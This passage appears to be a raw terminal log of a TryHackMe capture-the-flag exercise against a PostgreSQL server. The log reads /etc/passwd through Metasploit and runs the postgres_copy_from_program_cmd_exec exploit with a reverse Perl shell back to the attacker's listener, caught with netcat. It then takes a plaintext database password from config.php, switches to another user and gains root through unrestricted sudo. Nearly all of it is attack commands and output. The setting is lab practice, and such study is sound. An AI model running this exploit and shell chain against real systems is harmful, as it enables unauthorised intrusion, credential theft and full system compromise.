proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
alison:x:1000:1000:Poster,,,:/home/alison:/bin/bash
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
postgres:x:109:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
dark:x:1001:1001::/home/dark:
[+] 10.49.166.197:5432 - 10.49.166.197:5432 Postgres - /etc/passwd saved in /root/.msf4/loot/20260618083517_default_10.49.166.197_postgres.file_532869.txt
[*] Auxiliary module execution completed
msf auxiliary(admin/postgres/postgres_readfile) > 

```

```
msf auxiliary(admin/postgres/postgres_readfile) > use 18
[*] Using configured payload cmd/unix/reverse_perl
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > show options

Module options (exploit/multi/postgres/postgres_copy_from_program_cmd_exec):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   DUMP_TABLE_OUTPUT  false            no        select payload command output from table (For Debugging)
   TABLENAME          XvATKIU5It       yes       A table name that does not exist (To avoid deletion)


   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on


   Used when making a new connection via RHOSTS:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  postgres         no        The database to authenticate against
   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
   RHOSTS                     no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     5432             no        The target port (TCP)
   USERNAME  postgres         no        The username to authenticate as


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set rhost 10.49.166.197
rhost => 10.49.166.197
msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set PASSWORD password
PASSWORD => password
msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set lhost 192.168.128.61
lhost => 192.168.128.61
msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > run
[*] Started reverse TCP handler on 192.168.128.61:4444 
[*] 10.49.166.197:5432 - 10.49.166.197:5432 - PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit
[*] 10.49.166.197:5432 - Exploiting...
[+] 10.49.166.197:5432 - 10.49.166.197:5432 - XvATKIU5It dropped successfully
[+] 10.49.166.197:5432 - 10.49.166.197:5432 - XvATKIU5It created successfully
[+] 10.49.166.197:5432 - 10.49.166.197:5432 - XvATKIU5It copied successfully(valid syntax/command)
[+] 10.49.166.197:5432 - 10.49.166.197:5432 - XvATKIU5It dropped successfully(Cleaned)
[*] 10.49.166.197:5432 - Exploit Succeeded
[*] Command shell session 1 opened (192.168.128.61:4444 -> 10.49.166.197:56584) at 2026-06-18 08:39:55 -0400

id
uid=109(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)
pwd
/var/lib/postgresql/9.5/main
/bin/bash
cd ../../../../../
pwd
/
cd home
ls
alison
dark
cd alison
ls
user.txt
cat user.txt
cat user.txt
ls -la
total 40
drwxr-xr-x 4 alison alison 4096 Jul 28  2020 .
drwxr-xr-x 4 root   root   4096 Jul 28  2020 ..
-rw------- 1 alison alison 2444 Jul 28  2020 .bash_history
-rw-r--r-- 1 alison alison  220 Jul 28  2020 .bash_logout
-rw-r--r-- 1 alison alison 3771 Jul 28  2020 .bashrc
drwx------ 2 alison alison 4096 Jul 28  2020 .cache
drwxr-xr-x 2 alison alison 4096 Jul 28  2020 .nano
-rw-r--r-- 1 alison alison  655 Jul 28  2020 .profile
-rw-r--r-- 1 alison alison    0 Jul 28  2020 .sudo_as_admin_successful
-rw------- 1 alison alison   35 Jul 28  2020 user.txt
-rw-r--r-- 1 root   root    183 Jul 28  2020 .wget-hsts
mget user.txt
pwd
/home/alison
cd ../../
cd var
ls
backups
cache
lib
local
lock
log
mail
opt
run
spool
tmp
www
cd www
cd html
ls
config.php
poster
cat config.php
<?php 

        $dbhost = "127.0.0.1";
        $dbuname = "alison";
        $dbpass = "p4ssw0rdS3cur3!#";
        $dbname = "mysudopassword";
?>
pwd
/var/www/html
su alison
p4ssw0rdS3cur3!#
whoami
postgres
python -c 'import pty; pty.spawn("/bin/bash")'
^C
Abort session 1? [y/N]  y

[*] 10.49.166.197 - Command shell session 1 closed.  Reason: User exit
msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > run
[-] Handler failed to bind to 192.168.128.61:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[*] 10.49.166.197:5432 - 10.49.166.197:5432 - PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit
[*] 10.49.166.197:5432 - Exploiting...
[+] 10.49.166.197:5432 - 10.49.166.197:5432 - XvATKIU5It dropped successfully
[+] 10.49.166.197:5432 - 10.49.166.197:5432 - XvATKIU5It created successfully
[+] 10.49.166.197:5432 - 10.49.166.197:5432 - XvATKIU5It copied successfully(valid syntax/command)
[+] 10.49.166.197:5432 - 10.49.166.197:5432 - XvATKIU5It dropped successfully(Cleaned)
[*] 10.49.166.197:5432 - Exploit Succeeded
[*] Exploit completed, but no session was created.
msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > run
[*] Started reverse TCP handler on 192.168.128.61:4444 
[*] 10.49.166.197:5432 - 10.49.166.197:5432 - PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit
[*] 10.49.166.197:5432 - Exploiting...
[+] 10.49.166.197:5432 - 10.49.166.197:5432 - XvATKIU5It dropped successfully
[+] 10.49.166.197:5432 - 10.49.166.197:5432 - XvATKIU5It created successfully
[+] 10.49.166.197:5432 - 10.49.166.197:5432 - XvATKIU5It copied successfully(valid syntax/command)
[+] 10.49.166.197:5432 - 10.49.166.197:5432 - XvATKIU5It dropped successfully(Cleaned)
[*] 10.49.166.197:5432 - Exploit Succeeded
[*] Command shell session 2 opened (192.168.128.61:4444 -> 10.49.166.197:56588) at 2026-06-18 08:52:49 -0400

[*] 10.49.166.197 - Command shell session 2 closed.
msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > 

```


```

nc -lvnp 4444                  
listening on [any] 4444 ...
connect to [192.168.128.61] from (UNKNOWN) [10.49.166.197] 56586
pwd
/var/lib/postgresql/9.5/main
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c "import pty;pty.spawn('/bin/bash')"
postgres@ubuntu:/var/lib/postgresql/9.5/main$ cd ../../../../
cd ../../../../
postgres@ubuntu:/var$ cd www
cd www
postgres@ubuntu:/var/www$ cd html
cd html
postgres@ubuntu:/var/www/html$ ls
ls
config.php  poster
postgres@ubuntu:/var/www/html$ cat config.php
cat config.php
<?php 

        $dbhost = "127.0.0.1";
        $dbuname = "alison";
        $dbpass = "p4ssw0rdS3cur3!#";
        $dbname = "mysudopassword";
?>postgres@ubuntu:/var/www/html$ su alison
su alison
Password: p4ssw0rdS3cur3!#

alison@ubuntu:/var/www/html$ cd ../../../
cd ../../../
alison@ubuntu:/$ cd home
cd home
alison@ubuntu:/home$ cd alison
cd alison
alison@ubuntu:~$ ls
ls
user.txt
alison@ubuntu:~$ cat user.txt
cat user.txt
THM{postgresql_fa1l_conf1gurat1on}
alison@ubuntu:~$ sudo -l
sudo -l
[sudo] password for alison: p4ssw0rdS3cur3!#

Matching Defaults entries for alison on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alison may run the following commands on ubuntu:
    (ALL : ALL) ALL
alison@ubuntu:~$ sudo -s
sudo -s
root@ubuntu:~# ls
ls
user.txt
root@ubuntu:~# cd ../../
cd ../../
root@ubuntu:/# cd root
cd root
root@ubuntu:/root# ls
ls
root.txt
root@ubuntu:/root# cat root.txt
cat root.txt
THM{c0ngrats_for_read_the_f1le_w1th_credent1als}
root@ubuntu:/root# 
Session terminated, terminating shell...exit
alison@ubuntu:~$ Hangup
postgres@ubuntu:/var/www/html$                                                                                                                                                               
┌──(root㉿kali)-[/home/kali/Desktop/Tryhackme]
└─# 

```


```
hellojack
```
